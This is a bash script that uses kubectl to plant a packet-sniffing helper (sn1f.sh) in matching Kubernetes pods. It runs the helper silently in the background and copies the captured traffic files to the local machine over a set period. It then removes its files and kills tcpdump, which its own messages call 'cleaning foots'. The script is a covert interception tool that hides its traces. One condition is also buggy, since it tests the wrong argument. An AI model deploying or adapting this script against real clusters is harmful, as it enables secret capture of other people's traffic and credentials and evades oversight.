#!/bin/bash
namespace=$1
filter_pod=$2
snif_time=$3
pod_list=$(kubectl get pods -n $namespace -o json | jq -r .items[].metadata.name)
echo "[*] Executing sn1f.sh in namespace: $namespace"
for pod in $pod_list
do
  if [[ $pod == *"$filter_pod"* ]]; then
      echo $pod
      kubectl cp sn1f.sh $pod:/home -n $namespace
      sleep 5
      kubectl exec -i $pod -n $namespace -- /bin/bash -c "/home/sn1f.sh $pod > /dev/null 2> /dev/null &"
      echo "[+] Injecting snffing"
      sleep 10
  fi
done
runtime="$snif_time minute"
endtime=$(date -ud "$runtime" +%s)
echo "[*] Extractng sniffing files during $runtime"
while [[ $(date -u +%s) -le $endtime ]]
do
    echo "[+] Time Now: `date +%H:%M:%S`"
    for pod in $pod_list
    do
      if [[ $pod == *"$filter_pod"* ]]; then
         echo "[+] - Checking snif file in pod:  $pod"
         file_list=$(kubectl exec -it  -n $namespace $pod -- ls -l /home/ | awk '{ if ($5 >= 999990) { print $9} }')
         if [ -z "$1" ]
         then
	      echo "[-] --- Waiting until file is full"
         else
              for file in $file_list
              do
                file=$(echo $file | sed 's/\r$//')
                echo "[+] >>> Etracting file $file"
                kubectl cp $namespace/$pod:/home/$file data/$file-$(date +"%s")
                sleep 5
                kubectl exec -i $pod -n $namespace -- /bin/bash -c "rm -rf /home/$file"
                sleep 5
              done
         fi
      fi
    done
    sleep 30 #30 secons
done
echo "[*] End sniffing!!"
echo "[*] Cleaning foots"
for pod in $pod_list
do
  if [[ $pod == *"$filter_pod"* ]]; then
      echo "[+] Removing files in pod $pod"
      kubectl exec -i $pod -n $namespace -- /bin/bash -c "rm -rf /home/sn1f* > /dev/null 2> /dev/null &"
      sleep 2
      echo "[+] Killing tcpdum process"
      tcpdump_PID=$(kubectl exec -it $pod -n $namespace -- /bin/bash -c "ps aux" | grep tcpdump | awk '{print $2}')
      kubectl exec -i $pod -n $namespace -- /bin/bash -c "kill -9 $tcpdump_PID"
      sleep 2
  fi
done
echo "[+] Merging pcap files"
mergecap -w data/merge-sn1f.pcap data/sn1f-app-*
echo "[*] Have a nice day body!!"
